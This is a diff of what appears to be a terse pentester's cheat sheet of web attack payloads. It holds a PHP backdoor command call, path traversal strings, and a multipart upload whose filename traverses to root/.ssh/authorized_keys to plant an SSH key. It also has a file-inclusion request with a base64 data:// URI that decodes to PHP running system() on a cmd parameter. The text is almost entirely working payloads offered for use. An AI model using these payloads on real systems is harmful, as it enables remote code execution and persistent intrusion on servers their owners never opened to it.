@@ -12,9 +12,12 @@ PHP Payload
 simple-backdoor.php?cmd=cat%20/opt/install.txt
 # above file uploaded function over http call
 
-Path traversal on Windows OS
+Path traversal
 /../../../../../../../../users/install.txt
-curl --path-as-is # help to not get trouble
+curl --path-as-is
+# help to not get trouble
+Content-Disposition: form-data; name="myFile"; filename="../../../../../../../root/.ssh/authorized_keys"
+# on Burp include file on stranges paths
 
 curl@
 index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=uname%20-a
